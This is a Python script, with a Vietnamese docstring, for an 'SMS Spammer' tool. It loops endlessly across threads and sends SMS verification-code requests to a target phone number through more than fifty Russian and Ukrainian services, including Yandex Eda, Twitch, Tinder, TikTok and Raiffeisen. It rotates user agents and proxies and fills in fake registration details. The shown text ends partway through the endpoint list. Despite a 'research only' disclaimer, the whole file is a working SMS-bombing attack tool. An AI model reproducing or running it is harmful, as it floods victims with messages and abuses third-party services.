#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tool spam SMS - Chạy đa luồng, gửi yêu cầu OTP đến hàng loạt dịch vụ Nga/Ukraine
Chỉ dùng cho mục đích nghiên cứu. Tác giả không chịu trách nhiệm về việc lạm dụng.
"""
import sys
import os
import random
import threading
import time
import json
from datetime import datetime

# Thư viện bên ngoài: cài đặt bằng pip install requests colorama user_agent
try:
    import requests
    from colorama import Fore, Style, init
    from user_agent import generate_user_agent
except ImportError as e:
    print(f"Thiếu thư viện: {e}. Chạy: pip install requests colorama user_agent")
    sys.exit(1)

init(autoreset=True)

# Màu sắc tùy chỉnh
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
BRIGHT = Style.BRIGHT
RESET = Style.RESET_ALL

VERSION = "2.0"
USER_AGENT = generate_user_agent()

# Hàm xóa màn hình
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Banner
def print_banner():
    clear_screen()
    print(BRIGHT + GREEN)
    print(r"  ___ ___  _   __  __ __  __ ___ ___  ")
    print(r" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
    print(r" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
    print(r" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
    print(RESET)
    print(BRIGHT + BLUE + f"     SMS Spammer v{VERSION} - Multi-thread")
    print(RESET)

# Kiểm tra kết nối internet
def check_internet():
    try:
        requests.get("https://www.google.com", timeout=3)
        return True
    except:
        print(BRIGHT + RED + "[!] Không có kết nối Internet.")
        sys.exit(1)

# Định dạng số điện thoại theo mặt nạ
def format_phone(phone, mask):
    phone_list = list(phone)
    for ch in phone_list:
        mask = mask.replace("#", ch, 1)
    return mask

# Tạo proxy ngẫu nhiên từ file (nếu có)
def generate_proxy():
    proxy_list = []
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    proxy_list.append({"http": line, "https": line})
    if proxy_list:
        return random.choice(proxy_list)
    return None

# Hàm spam chính - mỗi luồng gọi vô hạn
def spam_worker(phone, use_proxy):
    phone_raw = phone
    phone9 = phone[1:]  # bỏ dấu +
    proxy = generate_proxy() if use_proxy else None
    
    # Tạo thông tin giả
    name = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=12))
    password = name + ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
    email = name + "@gmail.com"
    
    headers_base = {"User-Agent": generate_user_agent()}
    session = requests.Session()
    
    while True:
        try:
            # 1. Zoloto585
            formatted = format_phone(phone, "+# (###) ###-##-##")
            session.post("https://zoloto585.ru/api/bcard/reg/",
                         json={"name": "", "surname": "", "patronymic": "", "sex": "m",
                               "birthdate": "..", "phone": formatted, "email": "", "city": ""},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 2. xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai
            formatted = format_phone(phone9, "8(###)###-##-##")
            session.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",
                         data={"phone": formatted}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 3. Youla
            session.post("https://youla.ru/web-api/auth/request_code",
                         data={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 4. Yaponchik
            formatted = format_phone(phone, "+# (###) ###-##-##")
            session.post("https://yaponchik.net/login/login.php",
                         data={"login": "Y", "countdown": "0", "step": "phone",
                               "redirect": "/profile/", "phone": formatted, "code": ""},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 5. Yandex Eda
            session.post("https://eda.yandex/api/v1/user/request_authentication_code",
                         json={"phone_number": "+" + phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 6. Iconjob
            session.post("https://api.iconjob.co/api/auth/verification_code",
                         json={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 7. Wi-Fi.ru
            session.post("https://cabinet.wi-fi.ru/api/auth/by-sms",
                         data={"msisdn": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 8. Webbankir
            session.post("https://ng-api.webbankir.com/user/v2/create",
                         json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович",
                               "mobilePhone": phone, "email": email, "smsCode": ""},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 9. VSK shop
            session.post("https://shop.vsk.ru/ajax/auth/postSms/",
                         data={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 10. Twitch
            session.post("https://passport.twitch.tv/register?trusted_request=true",
                         json={"birthday": {"day": 11, "month": 11, "year": 1999},
                               "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                               "include_verification_code": True, "password": password,
                               "phone_number": phone, "username": name},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 11. Utair
            session.post("https://b.utair.ru/api/v1/login/",
                         json={"login": phone, "confirmation_type": "call_code"},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 12. R-Ulybka
            formatted = format_phone(phone, "#(###)###-##-##")
            session.post("https://www.r-ulybka.ru/login/form_ajax.php",
                         data={"action": "auth", "phone": formatted},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 13. Uklon (client)
            session.post("https://uklon.com.ua/api/v1/account/code/send",
                         headers={"client_id": "6289de851fc726f887af8d5d7a56c635",
                                  "User-Agent": generate_user_agent()},
                         json={"phone": phone}, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 14. Uklon partner
            session.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",
                         headers={"client_id": "6289de851fc726f887af8d5d7a56c635",
                                  "User-Agent": generate_user_agent()},
                         json={"phone": phone}, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 15. UBKI
            session.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",
                         json={"doc": {"auth": {"mphone": "+" + phone, "bdate": "11.11.1999",
                                                "deviceid": "00100", "version": "1.0",
                                                "source": "site", "signature": "undefined"}}},
                         headers={"Accept": "application/json", "User-Agent": generate_user_agent()},
                         proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 16. Top-shop
            formatted = format_phone(phone, "+# (###) ###-##-##")
            session.post("https://www.top-shop.ru/login/loginByPhone/",
                         data={"phone": formatted}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 17. Topbladebar
            formatted = format_phone(phone9, "8(###)###-##-##")
            session.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",
                         data={"phone": formatted}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 18. Tinder
            session.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                         data={"phone_number": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 19. TikTok
            session.post("https://m.tiktok.com/node-a/send/download_link",
                         json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                               "Mobile": phone9, "page": {"pageName": "home", "launchMode": "direct",
                                                          "trafficType": ""}},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 20. TheHive
            session.post("https://thehive.pro/auth/signup",
                         json={"phone": "+" + phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 21. Tele2
            session.post(f"https://msk.tele2.ru/api/validation/number/{phone}",
                         json={"sender": "Tele2"}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 22. Taxi Ritm
            formatted = format_phone(phone, "+# (###) ### - ## - ##")
            session.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",
                         data={"RECALL": "Y", "BACK_CALL_PHONE": formatted},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 23. Tarantino Family
            session.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",
                         data={"action": "callback_phonenumber", "phone": phone},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 24. Tabris
            session.post("https://lk.tabris.ru/reg/",
                         data={"action": "phone", "phone": phone},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 25. Tabasko
            session.post("https://tabasko.su/",
                         data={"IS_AJAX": "Y", "COMPONENT_NAME": "AUTH",
                               "ACTION": "GET_CODE", "LOGIN": phone},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 26. Sushi-Profi
            session.post("https://www.sushi-profi.ru/api/order/order-call/",
                         json={"phone": phone9, "name": name},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 27. Sushi-Master
            session.post("https://client-api.sushi-master.ru/api/v1/auth/init",
                         json={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 28. xn--80aaispoxqe9b
            formatted = format_phone(phone9, "8(###)###-##-##")
            session.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",
                         data={"phone": formatted}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 29. SushiGourmet
            formatted = format_phone(phone9, "8 (###) ###-##-##")
            session.post("http://sushigourmet.ru/auth",
                         data={"phone": formatted, "stage": 1},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 30. SushiFuji
            session.post("https://sushifuji.ru/sms_send_ajax.php",
                         data={"name": "false", "phone": phone},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 31. Sunlight
            session.post("https://api.sunlight.net/v3/customers/authorization/",
                         data={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 32. Suandshi
            session.get("https://suandshi.ru/mobile_api/register_mobile_user",
                        params={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 33. PizzaSushiWok (restore)
            formatted = format_phone(phone9, "8-###-###-##-##")
            session.post("https://pizzasushiwok.ru/index.php",
                         data={"mod_name": "registration", "tpl": "restore_password",
                               "phone": formatted},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 34. Sportmaster UA
            session.get("https://www.sportmaster.ua/",
                        params={"module": "users", "action": "SendSMSReg", "phone": phone},
                        headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 35. Sportmaster RU
            formatted = format_phone(phone, "+# (###) ###-##-##")
            session.get("https://www.sportmaster.ru/user/session/sendSmsCode.do",
                        params={"phone": formatted}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 36. SMS4B
            session.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
                         data={"demo_number": "+" + phone, "ajax_demo_send": "1"},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 37. Smart.space
            session.post("https://smart.space/api/users/request_confirmation_code/",
                         json={"mobile": "+" + phone, "action": "confirm_mobile"},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 38. ShopandShow
            session.post("https://shopandshow.ru/sms/password-request/",
                         data={"phone": "+" + phone, "resend": 0},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 39. Shafa (registration)
            session.post("https://shafa.ua/api/v3/graphiql",
                         json={"operationName": "RegistrationSendSms",
                               "variables": {"phoneNumber": "+" + phone},
                               "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 40. Shafa (reset password)
            session.post("https://shafa.ua/api/v3/graphiql",
                         json={"operationName": "sendResetPasswordSms",
                               "variables": {"phoneNumber": "+" + phone},
                               "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 41. Sayoris
            session.post("https://sayoris.ru/?route=parse/whats",
                         data={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 42. SauriSushi
            session.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",
                         data={"data": {"login": phone9, "check": True, "crypto": {"captcha": "739699"}}},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 43. Rutube
            session.post("https://pass.rutube.ru/api/accounts/phone/send-password/",
                         json={"phone": "+" + phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 44. Rutaxi
            session.post("https://rutaxi.ru/ajax_auth.html",
                         data={"l": phone9, "c": "3"}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 45. Rieltor
            session.post("https://rieltor.ua/api/users/register-sms/",
                         json={"phone": phone, "retry": 0}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 46. RichFamily
            session.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
                         data={"phone": "+" + phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 47. Rendez-vous
            formatted = format_phone(phone, "+#(###)###-##-##")
            session.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
                         data={"phone": formatted, "alien": "0"}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 48. Raiffeisen
            session.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
                        params={"number": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 49. Qlean
            session.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                         json={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 50. Pozichka
            formatted = format_phone(phone, "+#-###-###-##-##")
            session.post("https://api.pozichka.ua/v1/registration/send",
                         json={"RegisterSendForm": {"phone": formatted}},
                         headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 51. Pliskov
            formatted = format_phone(phone, "+# (###) ###-##-##")
            session.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                         data={"phone": formatted}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
        
        try:
            # 52. Planetakino
            session.get("https://cabinet.planetakino.ua/service/sms",
                        params={"phone": phone}, headers=headers_base, proxies=proxy, timeout=5)
        except: pass
       
